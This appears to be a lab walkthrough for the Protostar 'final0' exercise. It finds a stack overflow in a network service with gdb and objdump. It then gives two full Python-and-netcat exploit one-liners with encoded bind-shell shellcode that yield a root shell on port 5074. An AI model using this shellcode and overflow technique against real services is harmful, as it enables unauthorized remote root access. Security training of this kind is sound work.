## Final0
* `python -c "print('A' * 512 + 'ABCDEFGHIJKLMNOPQRSTUVWXYZ')" | nc localhost 2995 `
* `gdb -q -c /tmp/core.11.final0.1894`
* `#0  0x58575655 in ?? ()`
* so buffer overflow works and `length = 532`
* shellcode https://www.exploit-db.com/exploits/13427/
* Two ways to execute the buffer
  1. `x/10x $esp-536` so we know the buffer address is `0xbffffa48`
  2. from `return strdup(buffer)` we can find the address of `call.*eax` by `objdump -d /opt/protostar/bin/final0 | grep "call.*eax"`
  ```
   8048d5f: ff d0                   call   *%eax
   804992b:   ff d0                   call   *%eax
  ```
  through `x/i 0x8048d5f` and `x/i 0x804992b` we can sure that `0x8048d5f` is what we want
* `python -c 'print("\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5f\x81\xef\xdf\xff\xff\xff\x57\x5e\x29\xc9\x80\xc1\xb8\x8a\x07\x2c\x41\xc0\xe0\x04\x47\x02\x07\x2c\x41\x88\x06\x46\x47\x49\xe2\xedDBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKBAFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIAJDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJOBLAALMNIA" + "A"*306 + "\x48\xfa\xff\xbf" + "\n")' | nc localhost 2995`
OR
* `python -c 'print("\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5f\x81\xef\xdf\xff\xff\xff\x57\x5e\x29\xc9\x80\xc1\xb8\x8a\x07\x2c\x41\xc0\xe0\x04\x47\x02\x07\x2c\x41\x88\x06\x46\x47\x49\xe2\xedDBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKBAFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIAJDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJOBLAALMNIA" + "A"*306 + "\x5f\x8d\x04\x08" + "\n")' | nc localhost 2995`
* this is a "Bindshell puerto 5074", so open another shell and run `nc localhost 5074` we get the root shell